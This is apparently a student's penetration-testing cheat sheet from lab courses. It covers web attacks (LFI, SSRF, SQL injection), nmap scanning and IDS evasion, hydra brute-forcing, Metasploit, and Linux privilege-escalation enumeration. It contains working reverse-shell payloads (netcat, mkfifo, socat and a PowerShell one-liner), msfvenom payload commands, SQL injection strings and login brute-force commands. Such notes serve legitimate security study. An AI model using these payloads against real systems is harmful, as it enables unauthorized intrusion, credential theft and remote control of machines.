**web framework enumeration**
--
`Curl <url-of-favicon> | md5sum` | this can get a hash of a favicon from website tab to check against OWASP favicon db to get information about what framework is running https://wiki.owasp.org/index.php/OWASP_favicon_database
Look for comments, copyrights, patterns of code
--

**old content discovery**
--
Web archive of OSINT (has a time line of webscrapes) - https://archive.org/web/
--

**access to files**
--
Amazon s3 storage buckets - http(s)://{name}.s3.amazonaws.com - can be used to gain access to files of websites or users storing files on the cloud
--

**sub domain enumeration**
--
`https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui` - can be utilised to search for subdomains of a domain due to certificate transparency logs of a certificate authoritys SSL/TLS certificates. 
These websites provide browsable history of these certificates.
--
`-site:www.tryhackme.com site:*.tryhackme.com`- google dorking to find subdomain 
--
`dnsrecon -t brt -d <domain>` - brute force dns enumeration
--
`./sublist3r.py -d <domain>` - automated OSINT subdomain finder
--
`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.81.97 -fs <size>` - scans for VHOST (VHOST is a private dns and isn't publicly available) 
run command first without fs and size, then run with fs and most common size to filter out dummy results
--

**local file inclusion (LFI)**
--
Use `%00` null byte when requests are filtered, this stops further logic being executed
--
When error shows `directory/etc/passwd` instead of `directory/../../../../etc/passwd` use `....//....//` instead to bypass the filtering
--
If directory isn't specified in php function `file_get_contents` then you can use absolute path `/etc/passwd`
--
If directory is forced in the request then the directory must be included in the file inclusion vulnerabilities, instead of just `../../etc/passwd` you must use `<forceddir>/../../../../etc/passwd`
--
Cookie may be the value used - change it to a directory
--
Try different http requests (GET/POST)
--
If heavily filter use burp suite and add a body item to the request and forget about the address request - the body won't get filtered
--

**remote file inclusion (RFI)**
--
Vuln requires `allow_url_fopen` to be on
--
Run a server on machine to serve the php file to be included
--
Include patch `request?val=http://<ip>/<file>`
--

**username enumeration**
--
`ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:  application/x-www-form-urlencoded" -u http://10.10.83.203/customers/signup -mr "username already exists" > valid_user_names` | finds all valid usernames for signin through user signup form |
--

**web login bruteforce**
--
`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.83.203/customers/login -fc 200` | attempts to login with valid usernames through web login
--

**curl requests**
--
`curl 'http://10.10.83.203/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'` | get requests on password reset | check for logic flaws, information might be sent in get strings to php servers which can be tampered with to bypass auth
--
`curl https://10-10-111-232.p.thmlabs.com/api/v1/customer?id=1 --cookie "admin:false;session=c571b3eab879278d6a21d2de3b09ffd1"` | sending curl request with cookies
--

**online resources for cracking and encoding**
--
crackstation.net
--
base64decode.org
--

**IDOR (insecure direct object reference)**
direcetly access a record or object through manipulation of addresses or requests that you're not authroized for
--
play with id values in address bars to see if you can access information you're not authorised for
--
base64 - sometimes values are encoded with base64 and passed as cookies, decode the base64, edit the value/id, re-encode and send another request with the rencoded cooking using curl
--
hashed - sometimes values are hashed, check these with crackstation db, you may be able to find a pattern
-- 
undectable ids - If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability
--
idor is not always present in the addressbar, and can also be found in ajax requests and javascript files. sometimes they're in unreferenced params that have been left from developement. like user_id, /user/details?user_id=123 which can be found by parameter mining
--

**SSRF**
trick a server into returning edited or additional responses
--
can be found in address bar, hidden form fields, partial url (like just the hostname, api variable), or path of the url.
--hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.92.33 ssh
in case of partial url you may need to use &x= at the end of url to ignore the rest of the url
--
change part of url that request from another server to your own url to include into page
--
if doing blind ssrf where no information in echod to the page use external http logging - like requestbin.com, your own http server or burpsuite collaborator client
--
**DEFENDING AGAINST SSRF**
--
-deny lists- denies resources from a specified lists or pattern - workaround - use alternative refferences for example localhost/127.0.0.1 may be denied but 127.*.*.* or 127.0.0.1.nip.io wont be
in cloud services block 169.254.169.254 which contains metadata for the deployed server - bypassed by registering a subdomain on their own domain with a dns record that points to the op address
--
-allow lists- like a white lists, only allows resources on a specified list or pattern, for example a resource might have to begin with https://website.thm, this can be exploited by creating a subdomain on an attackers domain name with the pattern, this pattern would allow the attacker to control internal http request
--
--open rediret-- can be used if the above bypasses do not work - using a pattern redirect to a domain of the attackers choice
--
you can change the value of elements in the source file if they refer to resources in the file directory, then when that new data is retrieved on submit or re-request, retrieve it from where it is used, it may be in base64
--

**XSS**
--
stored xss - unfiltered user input - stored in database - every user that visits is affected
--
reflective xss - targeted - parameter of query string is sent to webpage and not filtered
--
dom based xss - works by finding resources the attacker can control that the user is pulling information from like wondow.location.x, and with the combination of the use of eval() function can be used to execute malicious code
--
blind xss - no way of testing if your attack/payload works, must have a callback through http request to be able to tell if the attack is successful, can use xsshunter tool to test for blind xss attacks - example, sending xss in a chat to support to expose a portal
--

**RCE (command injection)**
--
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami - example curl payload
--
blind rce should be tested with delay commands like ping or sleep, to test if a command is being executed
--
verbose rce will show results directly to the page, payload testing should use whoami ls etc
--
nc can be used to create a reverse shell
--
concatenate commands with & and &&
--
**preventing rce**
--
minimal use of potentially dangerous functions or libraries in a programming language
filtering input wihtout relying on a user's input
input sanitation on server and input checks on client
--
**php vulns**
--
Exec()
Passthru()
System()
--
**bypassing filters**
--
filter may strip certin characters, pass different values like hexadeciaml to bypass; example; `$payload - "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
--

**sqli**
--
error messages proves the existence of sqli vuln (test by adding a ' at the end of a request)
--
types of injection:
inband - same page exploit recieve results on the page - example - `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
error based - obtains information about the database and maps it out, use enumeration with like %
union based - used for extracting large armounts of data
--
use database() to find database name to use to enumerate with schema
--
**error based enum sqli (boolean)**
--
first find the corrent number of columns `union select 1` ... `union select 1, 2, 3`
this is used when results are not presented to the page but instead a binary response
set 1st query to a falsey response instead of empty string ('') and use union select to find a truthy response
page may return truthy responses like 0 or 1, or taken:true/false, where can enumerate db with sql, successful guesses will return truthy responses
enumerating name of db - `admin123' UNION SELECT 1,2,3 where database() like 's%';--` - 
enumerating table name - `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
enumerating column name - `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
enumerating username - `admin123' UNION SELECT 1,2,3 from users where username like 'a%`
enumerating password - `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
--
**error based enum sqli (time based)**
--
use sql sleep(x) function - when attempt is successful the sleep comand is envoked delaying the response
enumarate like boolean enum
--
**out of bound sqli**
--
1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.
--
**defending sqli**
--
prepared statements
input validation
escaping user input
--

**passive recon**
--
query dns servers with nslookup and dig, A, AAAA, MX, TXT types
--
whois dns info
--
DNSDumpster.com - used to find subdomains
shodan.io - indexes every connectable device online in a searchable database - can be used to check for connected an exposed devices throug the internet of target
--

**active recon**
--
use webbrowser apps (wappalyzer), ping, traceroute
--
telnet can be used to banner grab any TCP service running on a port, and possibly send messages
you can send a get request with telnet (GET / HTTP1.1 \r\n\r\n)
you must use proper commands for the protocol
--
you can use nc to banner grab
--

**host discovery nmap**
--
arp-scan -l
netdiscover
nmap -sn <x.x.x.0/mask>
--
arp scan/icmp scan/tcp or udp ping scan
--
arp-scan, masscan
--
masscan is very aggressive - takes similar approach to nmap - `masscan MACHINE_IP/24 -p22-25`, `masscan MACHINE_IP/24 ‐‐top-ports 100`
--
arp cannon pass the subnet layer, meaning a router will not pass on arp requests
--
arp query should precede icmp/ping when on same subnetwork
--
tcp/udp are useful for if/when icmp packets are blocked
--
icmp scanning to discover every host on a network (-PE) not always reliabe due to firewall blocking
(-PR) - echo scan
(-PP) - timestamp if echo is blocked
(-PM) - address mask alt if echo is blocked
(-PS<port/portrange>) - TCP SYN ping - TCP SYN request - alive host will respond with syn ack, down will respond with RST (without sudo will complete 3 way handshake which removes stealth)
requires sudo (-PA<port/portrange>) - ACK ping - responds with RST flag, singlaing host is up
(-PU) - UDP ping - sending to a closed port will respond with icmp port unreachable packet signaling host is up - otherwise no response expected
--
**nmap port scanning**
--
by default uses reverse-dns for online hosts as host names can reveal alot (-n is used to stop this)
by default looks up online hosts (-R is used to query dns server even for offlilne instead)
sepcific dns `--dns-servers DNS_SERVER`
--
`nmap -iL list_of_hosts.txt` | scan list of hosts
`nmap 10.11.12.15-20` | multiple hosts
`nmap scanme.nmap.org example.com` | multiple hosts
--
`nmap -sL <ip.ip.ip-ip/targets>` | detailed list of the hosts scanned - names might reveal information - can count hosts to be scanned
`-n` | prevents nmap to the dns
--
`nmap -PR -sn MACHINE_IP/24` | -PR performs arp scan only -sn performs only host discovery scan (no port scanning) | this command will run host discovery for all machines on your subnet
--
`-sT` | three way handshake tcp scan
`-sn` | prevent port scanning
--
`-F` | 100 most common ports
`-sS` | syn scan (faster)
`-sU` | UDP scan (can be used with other tcp scans)
`-T<0-5>` | speed of the scan timing, t1 used for real world situations to be sneaky, t4 used for ctfs, t5 can effect accuracy
`-r` | scan in consecutive order, can check which order ports open on boot up
`-sN` | NULL scan returns RST flag for closed ports, indicating port is either open | filtered or blocked by firewall - good for IDS evasion
`-sF` | FIN scan returns RST, ACK for closed ports, some firewalls will silently drop RST response
`-sX` | XMAS scan sets FIN, PSH and URG flags simultaneously, returns RST on closed port, otherwise open|filtered or firewall blocked
`-sM` | mainmon scan, sets FIN and ACK, some bsd systems will drop the RST response, wont work on most modern systems
`-sA` | ACK scan, receive a RST if port is closed or open, based of which responses return RST you can enumerate the firewall rules, `THIS FLAG IS USED FOR PRODING THE FIREWALL RULE SET AND CONFIG`
`-sW` | Window scan, sends ACK, examines the TCP Window field, on specific systems this can reveal that a port is open through information provided by the firewall. Sends RST regardless `USE AGAINST SERVERS BEHIND A FIREWALL`
`--scanflags <flags>` | custom flag, enter in any combinations of flags (URG, ACK, PSH, RST, SYN, FIN)
`-sV` | service detection on port (FORCES THREE WAY HANDSHAKE) -sS cannont be done
`--version-intensity <LEVEL>` | sets the intensity of service detection to find the most accurate results for versioning
`--version-light` | intensity 2
`--version-all` | intensity 9
`-O` | OS detection can be innaccurate, need to find one open and closed port to make a reliable guesss, fingerprinting is also distorted due to rising virtualization - take with grain of salt
`--traceroute` | finds the routers between attacker and target, thats with high ttl and decreases unlike linux/win traceroute
`-sC or --script=default` | default NSE scripts run in the scan to get extra information or services provide information for possible vulns
`--script "scriptname" ex: --script "ftp*` | execute nmap script with NSE, "ftp*" will run all ftp scripts in ftp category of NSE
`-oN or -oG or -oX (-oA for all)` | outputs of nmap scan, normal=human readable, grepable=good to search with grep, xml=for app?
`grep -i https scan_172_17_network.gnmap`| grepping nmap results
--
categories in the NSE directory include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln, that can be run in an nmap scan
scripts written in Lua
scripts are saved in /usr/share/nmap/scripts
--
ACK and Window scan are for exposing firewall rules only, just because a firewall is not blocking a specific port does not mean there is a service listening on that port, for example, the firewall rules may need to be updated to reflect recent service changes
--
Alternatively, you can choose to control the packet rate using `--min-rate <number>` and `--max-rate <number>`. For example, `--max-rate 10` or `--max-rate=10` ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using `--min-parallelism <numprobes>` and `--max-parallelism <numprobes>`. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, `--min-parallelism=512` pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.
--
**nmap debugging**
--
`--reason` | reasoning for why it returned that result (flags/ttl)
`-v or -vv` | verbose output
`-d or -dd` | debugging details 
--
**nmap spoofing and decoys**
--
`nmap -S <spoofed_ip> <ip>` | runs a scan while covering up the original ip address, rerouting responses to the spoofed ip, attacker must capture responses
`nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.217.110` | realistic spoof scan, no ping scan + define the interface for nmap to use
`--spoof-mac SPOOFED_MAC` | spoof mac address, can be used if on the same subnet/subnetwork
`nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.217.110` | decoy scan, responses will go the the specified ip address, this is used to mix in your own ip address with other addresses to shroud yourself, RND is random, ME is your ip
--
**firewall, ids(intrusion detection system) fragmented packets**
--
firewall generally checks ip header and transport layer header
sophisticated firewall would also try examin data carried
--
IDS inspects network packets for select behavioural patterns/specific content signatures, raises alerts when malicious rule is met, may also inspect data for malicious patterns
trying to bypass this is hard, but dividing a packet into smaller packets can help depending on type of firewall/ids
--
Nmap provides the option `-f` to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another `-f (-f -f or -ff)` will split the data into 16 byte-fragments instead of 8. You can change the default value by using the `--mtu`; however, you should always choose a multiple of 8
--
**idle/zombie scan**
--
spoofing only works in specific network conditions/setups which can have little use
we upgrade it with an idle scan
--
requires an idle system attack can communicate with (could be a printer)
probe makes it look like scan is coming from zombie
then host will check for indicators theat zombie recieved any response to the spoofed probe
--
this is accomplished by getting the IP ID
--
steps:
1. trigger zombie to record curren ip id of zombie
2. send spooefed(zombie ip) SYN packet to TCP port of target
3. trigger zombie again to respond to compare new IP ID with one recieved beforehand to check for increment of IP ID
--
IP ID increments only if the zombie responds to the target
if no increment of IP ID = from target RST = port closed
if incremented = target responded to zombie with SYN/ACK = port open
if target machine doesnt respond at all may be due to firewall rules = same result as closed port
--
**what to do incase of firewall during zombie scan**
--
For the final step, the attacker sends another SYN/ACK to the idle host. 
The idle host responds with an RST packet, incrementing the IP ID by one again. 
The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. 
If the difference is 1, it means the port on the target machine was closed or filtered. 
However, if the difference is 2, it means that the port on the target was open.
--
`nmap -sI ZOMBIE_IP 10.10.217.110` | zombie ip is an idle host
--

**http 80**
--
popular servers:
apache
iis
nginx
--

**ftp 21**
--
ftp is clear text, easy target for attackers due to exposing credentials
--
FileZilla (gui ftp)
--
`ftp <ip> or ftp <user>@<ip>` | command to connect
--
all commands are sent over control channel
once file requested another tcp connection is established to send the file over another channel
--
`USER <u>` +
`PASS <p>` | login to ftp server
--
`STAT` | provides added information
`SYST` | command shows the system type (unix/whatever)
`PASV` | switches mode to passive (data is sent over separate channel originating for an ftp clients port above port number 1023) active sends from originating port from the ftp servers port 20
`TYPE A` | file transfer mode to ascii
`TYPE I` | file transfer mode to binary
`GET <filename>` | start file transfer (change type for correct file (text = type a)
--

**smtp 25**
--
protocols to follow:
1. smiple mail transfer protocol (used to communicate with MTA) - uses clear text
2. post office protocol version 3 (POP3) or internet message access protocol (IMAP)
--
components of smtp:
1. Mail Submission Agent (MSA) - recieves message, checks for errors
2. Mail Transfer Agent (MTA) - sends message to the MTA of the recpient (can also function as an MSA)
3. Mail Delivery Agent (MDA) - delivers mail to the MUA (mua will collect from the MDA)
4. Mail User Agent (MUA) - email client
`MUA>MSA>MTA>MTA>MDA>MUA` | order of operations
--
interacting with smtp:
`helo <hostname>` | first command to start interacting (hostname could be telnet)
`mail from: <email>` | sending from
`rcpt to: <email>` | recipient
`data` | begin typing message to end message ENTER . ENTER (crlf.crlf) it then queues message to send
--
**POP3 110**
--
used to download email messages from MDA server
downloads from mail from servers and optionally deletes mail
--
login scheme:
USER
PASS
--
`STAT` | reply = +OK <number of messages> <size in octets(bytes)>
`LIST` | list of new messages
`RETR 1` | retrieve first message in the list
**IMAP 143**
--
sends in cleartext
synchonizes email across devices, mail stays saved in the MDA
commands need to be preceded by a random string to keep track of replys ("c1", "c2")
--
`<rstring> LOGIN <user> <pass>` | login
`<rstring> LIST "" "*"` | list mail folders
`EXAMINE INBOX` | shows new messages in inbox
--

**SSH**
--
uses username password auth
or
public key private key auth
--
`ssh mark@10.10.92.33` | login
`uname -r` | kernel release
--

**Sniffing tools**
--
used against clear text applications/protocols
TLS has been added to most protocols that use clear text such as HTTP to HTTPS
need access to a system between communication systems
--
Tcpdump
wireshark
Tshark - cli alt to wireshark
--
`sudo tcpdump port <port> -A` | sniffs packets of port and displays it in ascii (-A)
--

**MITM attacks**
--
mitigated by using Public key infrastructure and trusted root certs (CA cert authority) and TLS
--
tools:
ettercap
bettercap
--

**scp Secure Copy Protocol**
--
file transfer based on ssh
--
`scp mark@10.10.92.33:/home/mark/archive.tar.gz .` | transfer file to current directory from remote system
`scp backup.tar.bz2 mark@10.10.92.33:/home/mark/` | from local system to remote system
--

**password attacks**
--
hyrda tool
--
`hydra -l username -P wordlist.txt server service` | template usage of hydra for bruteforce password attack
`hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.92.33 ssh` | hyrda attack on ssh
`-s <port>` | non default port specification for the attack
`-V -vV` | verbose output
`-t <n>` | number of threads utilized
`-d` | debugging
--
passwords in different regions may be in a different langauge - no use using english
--
**password attack mitigation**
--
password policy
account lockouts
throttling auth attempts
captchas
public certificate auth
2fa (two factor auth)
using knowledge about authorised users, like IP based geolocation
--

**vuln categories**
--
operating system
misconfiguration
weak credentials
application logic
human-factor
--
frameworks
CVSS - scoring system of severity of vuln (impact driven)
VPR - for vulnerability management (risk driven to organization)
--
**vuln dbs**
--
NVD - lists all publicly categorised CVEs
exploit-db
rapid7 - vuln db aswell as exploit db (NVD and Exploit-DB combined)
github repos - good for finding fresh or rare exploits - filter results to find vulns and PoCs
searchsploit - offline copy of exploit-db
--
**vuln discorvery**
--
1. gather public information about target (if company supports alot of customers it could use helpdesk or something similar something to think about)
2. enumeration and scanning - (nmap, gobuster/ffuz, dns fuzzing)
3. application testing (could be a web app, look for app logins, look for version numbers gather addition information manually, try to break thinks, test client side exploits like xss, ssrf, csrf, rfi/lfi, test for weak passwords)
4. search vuln databases with any information you found (could use searchsploit, exploit-db)
5. exploit
--
**manual testing**
--
automated test make similar actions
--
test for:
security misconfigs - vulns due to developer oversite eg: exposing server information between app and attacker
broken access control - attacker is able to access parts of an application they're not supposed to be able to
insecure deserialization - insecure processing of data sent across an application/pass malicious code to application
injection - able to input malicious data into an application due to non sanitizing user input
--
read exploit scripts to enure configured properly and how to use them
--

**Metatsploit**
--
auxilary - contains supporting modules (scanners, crawlers, fuzzers etc)
encoders - encode exploit and payload to try and evade signature based antivirus
evasion - used to try evade antivirus software, use in combination with encoders
NOPs (NoOPeration) - represented as 0x90 following which the cpu will do nothing for one cycle - often used as buffer to achieve consistent payload sizes
post modules - post exploitation
--
singles - self contained payloads
stagers - downloaded first to download a stage
stages - downloaded by stagers, allows bigger payload size
--
`show options` | show exploit options
`show payloads` | show payloads for exploit
`back` | leave context
`info` | information about exploit
`search` | search for exploit
`serach type:auxilary telnet` | specific search of metasploit
`use <exploit/payload>` | use exploit / payload
`unset var/all` | removed a set param for exploit 
`setg or unsetg` | set of unset global values for exploits/cross module
`exploit/run` | execute exploit/send payload
`exploit -z` | instantly send exploit to background
`check` | checks whether target system is vulnerable to exploit without exploiting it
`background` | sends proccess to background returns your to msfcli
`sessions` | shows active sessions
`session -i <id>` | brings session to foreground
`unset payload` | clears selected payload from exploit
--
**msf scanning**
--
nmap can be used within msf - msf is not the fastest way but there are useful modules
use search with key words to find useful modules like search `smb login` | returning smb_login
--
useful moduls:
`scanner/discovery/udp_sweep` | quickly identify services on udp, will not do a full scan like nmap, good to find DNS or netbios
`scanner/smb/smb_version` or `scanner/smb/smb_enumshares` | good for corporate networks, quickly identify file share vulns or info
--
`search portscan` | searches for portscan module
--
**msf database setup**
--
1. `sudo systemctl start postgresql`
2. `msfdb init`
3. `sudo msfconsole`
4. `db_status`
--
`workspace` | lists available workspaces (workspaces separate projects)
`workspace -a/-d <workspace>` | add or delete workspace 
--
when launched with db metasploits help command will show help options fo the database backends commands
--
`db_namp <ip>` | will run nmap scan and save in msf db, then you can reach this information with hosts and services commands
`hosts` | displays host information (-h for help with commands)
`services` | displays service information for hosts
`services -S <service>` | search for specific services 
--
**msf exploitation**
--
try different payloads
use meterpreter search command to find files
hashdump for password hashes of users
--
**Msfvenom**
--
allows you to access all payloads available in msf
allows you to create payloads in different formats (php, exe, dll, elf, etc)
can generate standalone payloads or get usabale raw format like python
--
`<OS>/<arch>/<payload>` | general naming convention for finding payloads, windows x32 do not need arch property
example:
`linux/x86/shell_reverse_tcp`
`windows/shell_reverse_tcp`
staged protocols are represent with a / not underscore | `linux/x86/shell/reverse_tcp` | the latter is stageless
--
`msfvenom -p <PAYLOAD> <OPTIONS>` | standard syntax
--
`msfvenom -l payloads` | list payloads
`msfvenom --list formats` |  used to list supported output formats of a payload
`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64` | outputs the php/meterpreter/reverse_tcp payload in a raw base64 format for the payload
`msfvenom --list payloads | grep meterpreter` | specified search for payloads
--
**handlers**
--
needed to listen for incoming connections from msfvenom payloads (sometimes just needed in general)
--
`use exploit/multi/handler` | module used to set up handler for payload (supports all payloads, even meterpreter)
`exploit -j` | start listener as a background job
--
**exploitation walkthrough**
--
1. generate payload - `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
2. edit payload to make it usable/proper
3. set up multi hanler - `use exploit/multi/handler` - fill in default information thats required
4. set payload value of multi handler to the correct type of shell to match the type of shell from msfvenom
5. run handler
--
**common payloads used**
--
all reversed so they require a handler
--
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` | Linux Executable and Linkable Format (elf) | file needs to be chmod +x to run
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | windows
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php` | PHP
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py` | python
--
**post exploitation**
--
background the session established
search the post directory for a post exploit
set the session id of the backgrounded session
run post exploit
--

**meterpreter**
--
`help` | list all commands
--
most antivirus will detect
--
use post/<os>/gather to find more information about system
--
both single and staged
--
runs in the targets memory - this feature aims to avoid antivirus
Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs
--
`getpid` | gets process id of the running meterpreter
`getuid` | get user meterpreter is running as
`ps` | list processes and their names | search for processes using higher pivledged user
`migrate <pid>` | migrate to another process, can be used strategically | careful can remove privliedged when migrating
`hashdump` | spits our usernames and password on system | not mathematically possible to crack, may be able to find password using onlin NTLM databases or a rainbow table attack, can be used in pass the hash attacks
`search -f <file>` | search for file on system
`shell` | launch regular shell on system, use CTRL + Z to get back to meterpreter shell
`getsysttem` | attempt to elevate privledges
`load` | can be used to load additional tools like Kiwi or python language `help` will show new options
`sysinfo` | system information
--

**Shells**
--
url encode webshells when needed
--
tools:
netcat | binary available on kali at `/usr/share/windows-resources/binaries` for windows use
socat | netcat on steroids | not often installed | provides link between two points like port to a file, or port to a port
msf multi handler
msfvenom
--
`/usr/share/webshells` | included with kali
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md` | lots of shells/payloads
`https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` | more shells
`https://github.com/danielmiessler/SecLists` | contains some useful code for obtaining shells
--
when using a listener (nc -vlnp <port>) it is a good idea to use a well known port as it is more likely to get past outboud firewall rules on target but you will need to use sudo
--
**shell stabilisation**
--
python:
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm` | gives us common commands like clear
3. `stty raw -echo; fg` | turns of own terminal echo (access to autocompletes arrow keys and ctrl c to kill processes) then foregrounds shell
4. `reset` | once shell dies your own terminal wont echo, use this command to reset
--
rlwrap (needs installing on kali):
1. `rlwrap nc -lnvp <port>` | gives a much more stable shell straight away
2. `stty raw -echo; fg` | turns of own terminal echo (access to autocompletes arrow keys and ctrl c to kill processes) then foregrounds shell
--
next:
1. open another teminal and `stty -a` and note down rows and columns
2. `stty rows <number>`
3. `stty cols <number>`
--
**socat shell**
--
capable of creating encrypted shells - USED TO BYPASS IDS
--
reverse:
`socat TCP-L:<port> - ` | basic reverse shell listener
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` | windows connect back
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` | linux connect back
bind:
`socat TCP-L:<PORT> EXEC:"bash -li"` | linux listener
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes` | windows listener
`socat TCP:<TARGET-IP>:<TARGET-PORT> -` | bind connect
--
**socat fully stable linux shell (target needs socat installed or upload binary for special shell)**
--
`https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true` | precompiled library
--
`socat TCP-L:<port> FILE:`tty`,raw,echo=0` | listener can be connected to with any payload
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane` | special listener fully stable functioning shell, with errors and all
`-d -d` | increase verbosity for experiemntal use or if its not working correctly
--
**encrypted socat shells**
--
replace TCP with OPENSSL
--
1. generate certificate | `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
2. merge file outputs into single .pem file | `cat shell.key shell.crt > shell.pem`
3. setup reverse listener | `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
CERTIFICATE MUST BE USED ON WHICH DEVICE IS LISTENING
4. connect back | `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
same for a bind shell, just swap listner and bind, bind requires pem file to be sent across
--
`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0,FILE:`tty`,raw,echo=0 -` | listener
`socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane` | connect
--
**common shell payloads**
--
windows netcat binary when sent will work
`nc -lvnp <PORT> -e /bin/bash` | bind shell payload not included in most version because of insecurity
`nc <LOCAL-IP> <PORT> -e /bin/bash` | reverse shell payload not included in most version because of insecurity
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` | bind shell for linux incase of nc version secure
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` | reverse shell for linux
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | windows powershell oneliner
--

**Linux PrivEsc**
--
**enumeration**
--
automated enumeration tools:
`LinPeas`: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
`LinEnum`: https://github.com/rebootuser/LinEnum
`LES (Linux Exploit Suggester)`: https://github.com/mzet-/linux-exploit-suggester
`Linux Smart Enumeration`: https://github.com/diego-treitos/linux-smart-enumeration
`Linux Priv Checker`: https://github.com/linted/linuxprivchecker
`https://gtfobins.github.io/` | priv esc bin
--
`hostname` | can provide useful information about the system or not, give it ago
`uname -a` | system information, details about kernel, useful for finding kernel vulns
`/proc/version` | information about system processes, on many different linux distros, may give information about kernel and additional data lik whether a compiler like gcc is installed
`/etc/issue` | system information about operating system
`ps` | show running processes on linux system can show time used by procceses, may show active processes that we didnt know about
`ps -a` | view all processes
`ps axjf` | view process tree
`ps aux` | show processes for all users, display user that launched, display processes not attached to terminal, gives better understanding of system and potential vulns
`env` | environment variables
`sudo -l` | list commands current user can run using sudo
`ls -la` | list all files/folders in long format as well as hidden
`id` | users priv level
`/etc/passwd` | easy way to discover users on sys
`cat /etc/passwd | cut -d ":" -f 1` | proccess /etc/passwd for bruteforce input grepping for home may be more useful
`cat /etc/passwd | grep home` | grep for users in home
`history` | some idea about the target system, might reveal sensitive information
`ifconfig` | interface information, target machine may bea pivot point can be confirmed with `ip route`
`netstat` | used to check for existing communication on the system
`netstat -a` | shows all listening ports and established connections
`netstat -at or netstat -au` | used to list tcp or udp ports
`netstat -l` | list ports in listening mode use with `-t` for tcp open ports ready for connection
`netstat -s` | list network usage stats
`netstat -tp` | list connections with the service name and PID information can be used with `-l`
`netstat -i` | interface statistics
`netstat -ano` | display all sockets, do not resolve names, display timers
`find . -name flag1.txt`| find the file named “flag1.txt” in the current directory
